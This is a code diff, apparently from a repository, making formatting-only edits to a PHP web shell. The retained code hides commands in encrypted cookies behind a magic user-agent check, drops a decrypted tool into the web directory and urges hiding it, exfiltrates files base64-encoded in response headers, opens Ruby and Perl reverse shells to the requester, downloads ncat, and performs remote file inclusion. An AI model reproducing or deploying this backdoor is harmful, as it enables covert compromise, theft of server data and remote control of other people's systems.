@@ -131,20 +131,20 @@ _POSTDOC1;
 
 function b64($data, $switch)
 {
-    echo print_r($data)."\n";
+    echo print_r($data) . "\n";
     if ($switch === "u") {
         if (!empty($data) && is_array($data)) {
             if (!is_null($data['read'])) {
                 echo "\nMake sure you have found a writable directory, otherwise this will not go through\n";
-                $a = "./".substr(str_shuffle(allowed_chars), 0, rand(3, 5));
+                $a = "./" . substr(str_shuffle(allowed_chars), 0, rand(3, 5));
                 fputs(fopen($a, "x+"), openssl_decrypt($data['Base64_Encoded_Tool'], $data['Cipher'], $data['Key'], OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $data['IV'], $data['Tag'], $data['aad']));
                 echo "File saved at: {$a}\nYou may want to move this file out of the current web directory, so you can hide it. But this will do for now.\n";
                 return true;
             }
         }
-    }else{
-        if (is_file($data['read'])){
-            header("FileName: ".base64_encode(file_get_contents($data['read'])));
+    } else {
+        if (is_file($data['read'])) {
+            header("FileName: " . base64_encode(file_get_contents($data['read'])));
             return true;
         }
     }
@@ -285,9 +285,9 @@ function reverseConnections($methods, $host, $port, $shell)
         "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $useHost . "\"," . $usePort . ").to_i;exec sprintf(\"$useShell -i <&%d >&%d 2>&%d\",f,f,f)'",
         "perl" => sprintf("perl -e 'use Socket;\$i=\"%s\";\$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"%s -i\");};'", $useHost, (int)$usePort, $useShell),
     );
-    if ($methods == "default"){
+    if ($methods == "default") {
         $useMethod = $comma["bash"];
-    }else{
+    } else {
         $useMethod = $methods;
     }
     if (!empty($useMethod)) {
@@ -346,11 +346,11 @@ function windows($com, $r)
                     shell_exec("Invoke-WebRequest -Uri http://nmap.org/dist/ncat-portable-5.59BETA1.zip -OutFile nc1.zip");
                     $zip = new ZipArchive();
                     $unzipped = $zip->open("nc1.zip");
-                    if ($unzipped === true){
-                        $zip->extractTo($cdir."\\n\\");
+                    if ($unzipped === true) {
+                        $zip->extractTo($cdir . "\\n\\");
                         $zip->close();
                         echo("\nFile expanded to: " . $cdir);
-                    }else{
+                    } else {
                         echo("Could not expand file.\n");
                     }
                     break;
@@ -371,7 +371,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         $ct = null;
         $split = null;
         if ($_POST['cr'] === "1") {
-            $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes"=>false]));
+            $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes" => false]));
         } else {
             $s = $_COOKIE['jsessionid'];
             $v = explode(".", base64_decode($s));
@@ -393,24 +393,24 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         remoteFileInclude($_POST["doInclude"]);
     } elseif (isset($_COOKIE["cb64"])) {
         $aSX = explode(".", $_COOKIE['cb64']);
-        if (hash("sha512", $_COOKIE['jsessionid'], $binary=false) === $aSX[1]) {
+        if (hash("sha512", $_COOKIE['jsessionid'], $binary = false) === $aSX[1]) {
             $sp = explode('.', base64_decode($_COOKIE['jsessionid']));
             $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
-            $axD = unserialize(base64_decode($final), ['allowed_classes'=> false]);
+            $axD = unserialize(base64_decode($final), ['allowed_classes' => false]);
             b64($axD, $aSX[0]);
         }
     } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
         $splitter = explode(".", base64_decode($_COOKIE['jsessionid']));
-        if (function_exists(pcntl_fork()) === true){
-        $pid = pcntl_fork();
-        if ($pid === -1) {
-            die("\n\n");
-        } else {
-            pcntl_wait($status);
-            reverseConnections($splitter[0], $_SERVER['REMOTE_ADDR'], $splitter[1], $splitter[2]);
-            exit(0);
+        if (function_exists(pcntl_fork()) === true) {
+            $pid = pcntl_fork();
+            if ($pid === -1) {
+                die("\n\n");
+            } else {
+                pcntl_wait($status);
+                reverseConnections($splitter[0], $_SERVER['REMOTE_ADDR'], $splitter[1], $splitter[2]);
+                exit(0);
             }
-        }else{
+        } else {
             echo "Cannot fork, as it does not exist on this system..... using passthru\n";
             $re = null;
             passthru(reverseConnections($splitter[0], $_SERVER['REMOTE_ADDR'], $splitter[1], $splitter[2]), $re);
